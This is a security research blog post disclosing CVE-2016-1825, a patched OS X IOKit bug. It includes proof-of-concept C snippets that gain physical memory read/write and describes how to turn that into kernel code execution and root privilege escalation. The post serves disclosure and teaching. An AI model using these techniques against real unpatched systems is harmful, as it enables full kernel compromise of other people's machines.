---
layout: post
title: "physmem: Accessing Physical Memory from User Space on OS X"
author: Brandon Azad
date: 2017-01-12 15:00:00 -0800
category: security
tags: [CVE-2016-1825, CVE-2016-7617, macOS]
description: >
  Exploiting a logic bug in IOKit to directly access physical memory from user space.
---

Late in 2015 I was looking for a way to create an instance of an IOKit user client with a visible
NULL pointer dereference when I discovered something intriguing: the default implementation of
`IOService::newUserClient` checks the `IOUserClientClass` property on the service when determining
what user client class to allocate. This caught my attention because IOKit provides an API to set
arbitrary properties on an `IOService` from user space. If any `IOService` allowed setting the
`IOUserClientClass` property, that would create an opportunity for kernel code execution.

I immediately started looking for `setProperty` calls with attacker-controlled keys and values.
Amazingly, I found that `IOHIDevice` would iterate the attacker-supplied properties dictionary and
indiscriminately add each key-value pair to its own set of properties. This post is about how I
leveraged this vulnerability to gain read/write access to physical memory from user space, and how
this awesome primitive can be used to get fully reliable kernel code execution.

I reported this issue to Apple in January of 2016, and it was assigned [CVE-2016-1825]. It was
[fixed] in OS X El Capitan 10.11.5. A proof-of-concept exploit for this vulnerability (and the
variant CVE-2016-7617) is available in my [physmem] repository on GitHub. This vulnerability is not
present on iOS.

[CVE-2016-1825]: https://www.cve.mitre.org/cgi-bin/cvename.cgi?name=2016-1825
[fixed]: https://support.apple.com/en-us/HT206567
[physmem]: https://github.com/bazad/physmem

<!--more-->

## Table of Contents
{:.no_toc}

* TOC
{:toc}

## The vulnerability: CVE-2016-1825

Arbitrary properties can be associated with an `IORegistryEntry` using the methods `setProperty`
and `setProperties`. The default implementation of `setProperties` just returns an error. However,
subclasses of `IORegistryEntry` can override `setProperties` to allow user programs to set
properties via the `io_registry_entry_set_properties` Mach trap.

CVE-2016-1825 is a vulnerability in the method `IOHIDevice::setParamProperties` from
IOHIDFamily.kext. This method iterates a dictionary of key-value pairs and calls `setProperty` with
each pair:

{% highlight C++ %}
IOReturn IOHIDevice::setProperties( OSObject * properties )
{
    OSDictionary * propertyDict = OSDynamicCast(OSDictionary, properties);
    IOReturn       ret          = kIOReturnBadArgument;

    if ( propertyDict ) {
        if (propertyDict->setOptions(0, 0) & OSDictionary::kImmutable) {
            OSDictionary * temp = propertyDict;
            propertyDict = OSDynamicCast(OSDictionary, temp->copyCollection());
        }
        else {
            propertyDict->retain();
        }
        propertyDict->setObject(kIOHIDDeviceParametersKey, kOSBooleanTrue);
        ret = setParamProperties( propertyDict );
        propertyDict->removeObject(kIOHIDDeviceParametersKey);
        propertyDict->release();
    }

    return ret;
}

IOReturn IOHIDevice::setParamProperties( OSDictionary * dict )
{
    IOHIDEventService * eventService = NULL;

    if ( dict->getObject(kIOHIDEventServicePropertiesKey) == NULL ) {
        IOService * service = getProvider();
        if ( service )
            eventService = OSDynamicCast(IOHIDEventService, service);
    }

    if ( dict->getObject(kIOHIDDeviceParametersKey) == kOSBooleanTrue ) {
        OSDictionary * deviceParameters = OSDynamicCast(OSDictionary, copyProperty(kIOHIDParametersKey));

        if ( !deviceParameters ) {
            deviceParameters = OSDictionary::withCapacity(4);
        }
        else {
            if (deviceParameters->setOptions(0, 0) & OSDictionary::kImmutable) {
                OSDictionary * temp = deviceParameters;
                deviceParameters = OSDynamicCast(OSDictionary, temp->copyCollection());
                temp->release();
            }
            else {
                // do nothing
            }
        }

        if ( deviceParameters ) {
            // RY: Because K&M Prefs and Admin still expect device props to be
            // top level, let's continue to set them via setProperty. When we get
            // Max to migrate over, we can remove the interator code and use:
            // deviceParameters->merge(dict);
            // deviceParameters->removeObject(kIOHIDResetKeyboardKey);
            // deviceParameters->removeObject(kIOHIDResetPointerKey);
            // setProperty(kIOHIDParametersKey, deviceParameters);
            // deviceParameters->release();

            OSCollectionIterator * iterator = OSCollectionIterator::withCollection(dict);
            if ( iterator ) {
                OSSymbol * key;

                while ( ( key = (OSSymbol *)iterator->getNextObject() ) )
                    if (    !key->isEqualTo(kIOHIDResetKeyboardKey) &&
                            !key->isEqualTo(kIOHIDResetPointerKey) &&
                            !key->isEqualTo(kIOHIDScrollResetKey) &&
                            !key->isEqualTo(kIOHIDDeviceParametersKey) &&
                            !key->isEqualTo(kIOHIDResetLEDsKey)) {
                        OSObject * value = dict->getObject(key);

                        deviceParameters->setObject(key, value);
                        setProperty(key, value);
                    }

                iterator->release();
            }

            setProperty(kIOHIDParametersKey, deviceParameters);
            deviceParameters->release();

            // RY: Propogate up to IOHIDEventService level
            if ( eventService )
                eventService->setSystemProperties(dict);
        }
        else {
            return kIOReturnNoMemory;
        }
    }

    return( kIOReturnSuccess );
}
{% endhighlight %}

The issue is that the keys and values in the dictionary are entirely attacker-controlled, which
means a user program can set arbitrary IOKit registry properties on an instance of `IOHIDevice`.

This is dangerous because several IOKit properties are used to store privileged state that should
not be modifiable from user space. For example, some `IOService`s store the name of their user
client class in the registry under a property called `IOUserClientClass`. The default
implementation of `IOService::newUserClient` checks this property when allocating a new user
client:

{% highlight C++ %}
IOReturn IOService::newUserClient( task_t owningTask, void * securityID,
                                   UInt32 type,  OSDictionary * properties,
                                   IOUserClient ** handler )
{
    const OSSymbol *userClientClass = 0;
    IOUserClient *client;
    OSObject *temp;
...
    // First try my own properties for a user client class name
    temp = getProperty(gIOUserClientClassKey);
    if (temp) {
        if (OSDynamicCast(OSSymbol, temp))
            userClientClass = (const OSSymbol *) temp;
        else if (OSDynamicCast(OSString, temp)) {
            userClientClass = OSSymbol::withString((OSString *) temp);
            if (userClientClass)
                setProperty(kIOUserClientClassKey,
                        (OSObject *) userClientClass);
        }
    }

    // Didn't find one so lets just bomb out now without further ado.
    if (!userClientClass)
        return kIOReturnUnsupported;

    // This reference is consumed by the IOServiceOpen call
    temp = OSMetaClass::allocClassWithName(userClientClass);
    if (!temp)
        return kIOReturnNoMemory;

    if (OSDynamicCast(IOUserClient, temp))
        client = (IOUserClient *) temp;
    else {
        temp->release();
        return kIOReturnUnsupported;
    }

    if ( !client->initWithTask(owningTask, securityID, type, properties) ) {
        client->release();
        return kIOReturnBadArgument;
    }
...
    *handler = client;
    return kIOReturnSuccess;
}
{% endhighlight %}

Thus, a user space application can set the `IOUserClientClass` property on an instance of
`IOHIDevice` and then allocate an instance of any subclass of `IOUserClient` within the kernel.
This is clearly a serious issue. However, finding the best exploitation strategy requires a little
more digging.

## Finding the right user client

Many user clients override `IOUserClient::initWithTask` to perform additional checks on the user
task that is creating the connection. For instance, `IOHIDEventSystemUserClient::initWithTask`
checks that the user task has administrator privileges, and fails initialization if not. Thus, the
most interesting user clients will be those that don't perform these types of security checks
within `initWithTask`.

My first thought was to find a user client that accesses its provider (which is passed to the
client through the `IOUserClient::start` method) without dynamically checking the provider's type.
For instance, the `IOFramebufferUserClient` class performs a C-style cast of its provider in its
start method and then sets a field in the provider:

{% highlight C++ %}
bool IOFramebufferUserClient::start( IOService * _owner )
{
    if (!super::start(_owner))
        return (false);

    owner = (IOFramebuffer *) _owner;
    owner->serverConnect = this;

    return (true);
}
{% endhighlight %}

This write could be problematic in a few different ways. If `serverConnect` is at a sufficiently
large offset in `IOFramebuffer`, it might overwrite memory in the subsequent object on the heap.
Furthermore, even if `serverConnect` is within the bounds of the `IOHIDevice` object, it may
overlap with a sensitive field, such that the write corrupts the object and leads to an exploitable
condition.

After identifying several promising type confusions, I eventually happened upon a user client
called `IOPCIDiagnosticsClient`, in IOPCIFamily.kext. I suspect `IOPCIDiagnosticsClient` is meant
to be used to debug the PCI bridge. You can see examples of its usage in a tool called [pcidump].

[pcidump]: https://opensource.apple.com/source/IOPCIFamily/IOPCIFamily-257.40.3/tools/pcidump.c.auto.html

`IOPCIDiagnosticsClient` is implemented in [IOPCIBridge.cpp]. As you can see below, its
`externalMethod` will read and write physical memory if the `spaceType` parameter is
`kIOPCI64BitMemorySpace`.

[IOPCIBridge.cpp]: https://opensource.apple.com/source/IOPCIFamily/IOPCIFamily-257.40.3/IOPCIBridge.cpp.auto.html

{% highlight C++ %}
IOReturn IOPCIDiagnosticsClient::externalMethod(uint32_t selector, IOExternalMethodArguments * args,
                                                IOExternalMethodDispatch * dispatch, OSObject * target, void * reference)
{
    IOReturn                     ret = kIOReturnBadArgument;
    IOPCIDiagnosticsParameters * params;
    IOMemoryDescriptor         * md;
    IOMemoryMap                * map;
    void                       * vmaddr;
...
    if (kIOPCI64BitMemorySpace == params->spaceType)
    {
        md = IOMemoryDescriptor::withAddressRange(params->address.addr64, 
                (params->bitWidth >> 3), kIODirectionOutIn | kIOMemoryMapperNone, NULL);
        if (md)
        {
            map = md->map();
            md->release();
        }
        if (!map) return (kIOReturnVMError);
        vmaddr = (void *)(uintptr_t) map->getAddress();
    }

    switch (selector)
    {
        case kIOPCIDiagnosticsMethodWrite:

            if (kIOPCI64BitMemorySpace == params->spaceType)
            {
                switch (params->bitWidth)
                {
                    case 8:
                        *((uint8_t *) vmaddr) = params->value;
                        ret = kIOReturnSuccess;
                        break;
                    case 16:
                        *((uint16_t *) vmaddr) = params->value;
                        ret = kIOReturnSuccess;
                        break;
                    case 32:
                        *((uint32_t *) vmaddr) = params->value;
                        ret = kIOReturnSuccess;
                        break;
                    case 64:
                        *((uint64_t *) vmaddr) = params->value;
                        ret = kIOReturnSuccess;
                        break;
                    default:
                        break;
                }
            }
...
            break;

        case kIOPCIDiagnosticsMethodRead:

            if (kIOPCI64BitMemorySpace == params->spaceType)
            {
                switch (params->bitWidth)
                {
                    case 8:
                        params->value = *((uint8_t *) vmaddr);
                        ret = kIOReturnSuccess;
                        break;
                    case 16:
                        params->value = *((uint16_t *) vmaddr);
                        ret = kIOReturnSuccess;
                        break;
                    case 32:
                        params->value = *((uint32_t *) vmaddr);
                        ret = kIOReturnSuccess;
                        break;
                    case 64:
                        params->value = *((uint64_t *) vmaddr);
                        ret = kIOReturnSuccess;
                        break;
                    default:
                        break;
                }
            }
...
            break;

        default:
            break;
    }

    if (map) map->release();

    return (ret);
}
{% endhighlight %}

There are checks in place to ensure that `IOPCIDiagnosticsClient` can only be used by an authorized
user. Specifically, `IOPCIBridge::newUserClient` checks that the caller has administrator
privileges and that the debug boot argument is set before instantiating the client. However, these
checks are not performed in `IOPCIDiagnosticsClient::initWithTask`, so they are completely bypassed
when allocating this user client via the method above.

## Accessing physical memory

My next step was to write a proof-of-concept exploit that would leverage the ability to set
arbitrary properties in `IOHIDevice` instances to directly access physical memory. Creating the
connection to `IOPCIDiagnosticsClient` is quite simple:

{% highlight C %}
// Get a handle to a subclass of IOHIDevice that allows setting arbitrary
// IORegistry properties.
io_service_t service = IOServiceGetMatchingService(kIOMasterPortDefault,
        IOServiceMatching("IOHIDevice"));
// Set the IOUserClientClass property to IOPCIDiagnosticsClient.
IORegistryEntrySetCFProperty(service,
        CFSTR("IOUserClientClass"),
        CFSTR("IOPCIDiagnosticsClient"));
// Create a connection to the IOPCIDiagnosticsClient.
io_connect_t connection;
IOServiceOpen(service, mach_task_self(), 0, &connection);
{% endhighlight %}

Physical memory can then be read or written by calling the appropriate method on the user client:

{% highlight C %}
struct IOPCIDiagnosticsParameters param;
param.spaceType      = kIOPCI64BitMemorySpace;
param.bitWidth       = width * 8;
param.options        = 0;
param.address.addr64 = paddr;
param.value          = -1;
size_t size = sizeof(param);
IOConnectCallMethod(connection, kIOPCIDiagnosticsMethodRead,
                    NULL,       0,
                    &param,     sizeof(param),
                    NULL,       NULL,
                    &param,     &size);
// Result in param.value.
{% endhighlight %}

The initial version of physmem provided a simple command-line tool to read or write words of
physical memory. However, with such a powerful (and reliable) read/write primitive, I knew it would
be quite easy to get kernel code execution.

## Reliable kernel code execution

The first thing I needed to do is figure out how to turn my access to physical memory into access
to kernel virtual memory. Fortunately, there's a lot of information on physical memory analysis
online. According to a [paper] by Matthieu Suiche on BlackHat, virtual addresses within the kernel
image map directly to physical addresses, at least for 32-bit systems. After looking at the
[`ID_MAP_VTOP`][ID_MAP_VTOP] macro in XNU, I concluded that on 64-bit systems, a virtual address
within the kernel image can be translated to its corresponding physical address by discarding the
upper 32 bits:

[paper]: https://www.blackhat.com/presentations/bh-dc-10/Suiche_Matthieu/Blackhat-DC-2010-Advanced-Mac-OS-X-Physical-Memory-Analysis-wp.pdf
[ID_MAP_VTOP]: https://opensource.apple.com/source/xnu/xnu-3248.40.184/osfmk/i386/pmap.h.auto.html

{% highlight C %}
kernel_physical_address = kernel_virtual_address & 0xffffffff;
{% endhighlight %}

This is great for exploitability, since we can parse the kernel image on disk to look up the
addresses of kernel symbols, then convert those virtual addresses to their corresponding physical
addresses using the formula above. The one issue is bypassing OS X's implementation of kernel ASLR,
which causes the kernel to be loaded at a randomized base address each boot.

As it turns out, we don't need a separate vulnerability to find the kernel slide. The amount of
entropy in the kernel slide is quite low: on the order of 8 or 9 bits, not much more. This means we
can simply guess-and-check until we find the right kernel slide. Specifically, for each possible
kernel slide in increasing order, we will try to read the `kern.bootsessionuuid` sysctl variable,
and compare the returned data to its known value. It's highly unlikely that reading random physical
memory will return that exact UUID string, so if we find a kernel slide that works, it is
overwhelmingly likely that it is correct.[^1]

Thus, we know the kernel slide and we have a read/write primitive within the kernel image (but not
the heap or anywhere else). The next step is figuring out how to execute arbitrary code in the
kernel.

The customary approach in this situation is patching the system call table (called `sysent` in the
code) to add a new system call. By overwriting an unused sysent and pointing it to a dispatch stub
we inject into the kernel, we can call any function in the kernel with up to five arguments and get
the result back in user space.[^2]

Apple has defended against patching the system call table by not exporting the `_sysent` symbol and
by placing the table in a readonly region of kernel memory. As far as defenses go, hiding the
sysent symbol doesn't do much: it is quite easy to scan the kernel image to find it. (Just
calculate what the first several bytes must be given the first few system calls, then look for that
data within the kernel image.) On the other hand, placing the sysent table in readonly memory does
make patching more difficult. On iOS, Kernel Patch Protection makes this defense doubly effective,
since modifications to the sysent table will trigger a panic. Fortunately we don't have to deal
with KPP on macOS.

Unfortunately for Apple, we can completely bypass the memory protections on the sysent table
without doing anything: `IOPCIDiagnosticsClient` establishes a read-write mapping of the physical
address when writing, so we are actually writing to a writable virtual page that happens to map to
the same physical page as the readonly sysent table. Memory protections are associated with virtual
addresses, not physical addresses, so writing to the writable mapping of the same page doesn't
trigger any sort of memory protection error. Thus, our kernel image read/write primitive can also
write to readonly memory for free, rendering all virtual memory protections useless.

To establish an execute primitive, I overwrite the function `bsd_init` (which is not called after
boot) with a dispatch stub that calls the kernel function specified in the first syscall argument
with the parameters given by the remaining syscall arguments. I then overwrite an unused sysent to
point to `bsd_init`, at which point I can then call any function in the kernel with up to five
arguments.

What's great about this technique is that it is fully reliable. There's no memory corruption, no
racing, no hardcoded offsets, and no uncertainty. The same exploit strategy works without
modification across many different versions of OS X.

## Safe privilege escalation

It is worth mentioning the method I use for safe privilege escalation, which I alluded to in my
[last post] but didn't discuss in detail.

[last post]: /2016/05/mac-os-x-use-after-free/#elevating-privileges

In order to elevate privileges, we need to set the `cr_uid`, `cr_ruid`, and `cr_svuid` fields of
the current process's `ucred` structure to 0. However, doing this directly is dangerous, because
multiple processes can share the same `ucred`. This means that directly setting these fields can
cause other processes to also elevate to root, which is undesirable from a usability perspective
and messes up the accounting done in [`chgproccnt`][chgproccnt], leading to a panic on reboot.[^3]

[chgproccnt]: https://opensource.apple.com/source/xnu/xnu-3248.40.184/bsd/kern/kern_proc.c.auto.html

Instead, I elect to use the `kauth_cred_setsvuidgid` kernel API to set the saved UID and GID of the
current process to 0. Since this API is not designed to be conveniently called from user space, we
need to perform some setup and cleanup to avoid leaking memory.

The first step is obtaining the pointer to the current process's `proc` structure using
`current_proc`. Then, we can call `kauth_cred_proc_ref` with the `proc` pointer as an argument to
add a reference to the current process's `ucred` and return a pointer to it. Next, we call
`kauth_cred_setsvuidgid` on the `ucred` to set the saved UID and GID. This consumes a reference on
the supplied `ucred`, and if the `ucred` is shared with another process, a new `ucred` with the
saved UID and GID set to 0 is returned.

At this point we have a pointer to a `ucred` with a saved UID of 0, but the current process's
`ucred` still has the same number of references as before. In order to ensure that we don't leak
memory, we need to remove a reference on the current process's `ucred`. However, the function to do
this, `kauth_cred_unref`, accepts a `kauth_cred_t *`, which is a pointer to a pointer to a `ucred`
struct. We can't pass the address of the `ucred` pointer in the `proc` struct since if that `ucred`
is released, any references to the current process's `ucred` will be a use-after-free. Instead, we
need to store a pointer to the old `ucred` somewhere in memory and then pass the address of that
memory to `kauth_cred_unref`.

We can call `IOMalloc` (or `kalloc`, or any other kernel allocator) to allocate a pointer-size
region of memory, and then `copyin` to write the pointer to the old `ucred` to the allocated
memory. We call `copyin` again to set the `ucred` pointer in the current `proc` struct to the new
privileged credentials. Finally, we call `kauth_cred_unref` on the heap-allocated `ucred` pointer
to remove the reference, and then `IOFree` to free the allocation.

Now, the current process has a saved UID of 0, which means we can call `seteuid` to set the
effective UID to 0.

## Variant: CVE-2016-7617

In macOS Sierra 10.12.2, Apple [patched] a variant of this vulnerability known as [CVE-2016-7617].
This was a nearly identical issue in `AppleBroadcomBluetoothHostController`. You can see details of
this vulnerability at [Project Zero].

[patched]: https://support.apple.com/en-us/HT207423
[CVE-2016-7617]: https://www.cve.mitre.org/cgi-bin/cvename.cgi?name=2016-7617
[Project Zero]: https://bugs.chromium.org/p/project-zero/issues/detail?id=974

## Mitigations as of macOS 10.12.2

Starting in macOS Sierra 10.12.2, allocating instances of `IOPCIDiagnosticsClient` in order to
directly access physical memory from user space is more difficult. Apple has placed checks in
`IOPCIDiagnosticsClient::initWithTask` to ensure that the user task initiating the connection is
running as root and that the debug boot argument is set. Thus, this technique is largely dead on
new systems.

## Conclusion

In this post I discussed how I leveraged a logic error in IOKit that allowed writing to privileged
IOKit registry properties to establish a kernel execute primitive, and how to use reliable kernel
execution to safely elevate privileges. This bug was kind of magical: the stars aligned to make
exploitability almost as easy as possible (thank you, `IOPCIDiagnosticsClient`!). Nowadays,
elevating from user to kernel code execution usually takes multiple bugs.

A proof-of-concept privilege escalation is available in my [physmem] repository. Even though
CVE-2016-1825 was patched way back in 10.11.5, the exploit still works up to 10.12.1 due to the
variant CVE-2016-7617. Unfortunately, it's not as easy to exploit the variant in a virtual machine,
since `AppleBroadcomBluetoothHostController` is not loaded unless Bluetooth is present.

## Footnotes
{:.no_toc}

[^1]: In theory, there is a chance that any of the physical reads we do before determining the
      correct kernel slide could trigger a panic, because we are effectively reading random pages
      of physical memory. However, in practice I've never once experienced a panic while using this
      technique. I have not investigated exactly why this appears safe in practice, but my best
      guess is that physical memory is mapped contiguously from 0, meaning all physical pages we
      read will be valid as long as we test kernel slides in increasing order. Furthermore,
      memory-mapped registers and other dicey regions of virtual memory all seem to reside at
      different physical addresses than the ones we probe while determining the kernel slide.

      This technique does not work as well with a virtual memory read primitive, as compared to a
      physical memory read primitive, because we are likely to touch an unmapped page during the
      search, triggering a panic.

[^2]: Each system call can accept up to six 64-bit values passed from user space in the registers
      `rdi`, `rsi`, `rdx`, `r10` (*not* `rcx`), `r8`, and `r9`. The simple approach is for the
      dispatch stub to treat the first value as the function to call and the remaining five values
      as its arguments. We could theoretically pass an arbitrary number of parameters by having the
      dispatch stub copy in more arguments from user space, but calling arbitrary kernel functions
      with five arguments is sufficient for our purposes.

[^3]: The [tpwn] exploit tries to get around this by directly calling `chgproccnt` to adjust the
      number of processes. However, tpwn only changes the process count by one, effectively
      assuming that the current process's `ucred` struct is not shared. If the exploit is run under
      tmux, tpwn's `ucred` will be shared with tmux's, causing the system to panic on reboot.

[tpwn]: https://github.com/kpwn/tpwn
